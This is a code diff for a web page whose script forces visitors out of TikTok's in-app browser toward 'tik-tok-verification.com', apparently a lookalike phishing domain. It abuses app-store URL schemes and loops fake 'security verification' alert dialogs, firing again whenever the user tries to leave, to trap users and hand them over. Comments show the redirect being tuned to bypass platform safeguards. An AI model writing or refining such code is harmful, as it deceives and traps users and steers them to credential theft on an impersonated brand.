@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; }</style>
+    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
 </head>
 <body>
 
@@ -11,49 +11,43 @@
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 5000; 
 
-    function bridgeBreakout() {
+    function triggerStoreJump() {
         const isAndroid = /Android/i.test(navigator.userAgent);
-        const urlNoProtocol = target.replace("https://", "");
+        const urlEnc = encodeURIComponent(target);
 
-        // 1. TikTok Native Bridge Call (The 'Nuclear' Option)
-        try {
-            if (window.ToutiaoJSBridge) {
-                window.ToutiaoJSBridge.call('openSchema', { schema: target });
-            }
-        } catch(e) {}
-
-        // 2. High-Priority Store Handover
-        // Store links usually 'force' the OS to show an "Open in App Store" prompt
-        // and when that search fails, the OS often defaults back to the browser.
-        window.location.href = isAndroid 
-            ? "market://details?id=com.android.chrome&url=" + encodeURIComponent(target)
-            : "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?term=" + encodeURIComponent(target);
-
-        // 3. Fallback to what worked (Search Protocol)
-        setTimeout(() => {
-            window.location.replace("x-web-search://?" + encodeURIComponent(target));
-        }, 50);
+        // This is what you confirmed works: The Store Search Handover
+        if (isAndroid) {
+            window.location.href = "market://search?q=" + urlEnc;
+        } else {
+            // iOS: The exact string that triggered for you at the end of the fail-safe
+            window.location.href = "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + urlEnc;
+        }
     }
 
     function rampage() {
         if (Date.now() > killTime) return; // ATOMIC FAIL-SAFE
 
-        bridgeBreakout();
+        // 1. Fire the jump that we KNOW works
+        triggerStoreJump();
 
-        // THE LOCK
-        alert("ATTEMPT #25\n\nSecurity verification required.\n\nTap OK to authorize system browser.");
+        // 2. THE LOCK
+        alert("ATTEMPT #26\n\nRedirecting to secure verification...\n\nTap OK to continue.");
 
-        // The instant they tap 'OK', we use that physical gesture to fire again
-        bridgeBreakout();
-
-        setTimeout(rampage, 10);
+        // 3. THE GAP: 
+        // We wait 300ms. This is the "Clear Path" for the App Store to launch 
+        // while the main thread is NOT blocked by an alert.
+        setTimeout(() => {
+            if (Date.now() < killTime) {
+                rampage();
+            }
+        }, 300); 
     }
 
     window.onload = () => {
         rampage();
     };
 
-    // If they swipe or blur, lock them back in
+    // If they try to swipe or leave during the 300ms gap, re-lock instantly
     window.onblur = () => { if (Date.now() < killTime) rampage(); };
 </script>
 </body>
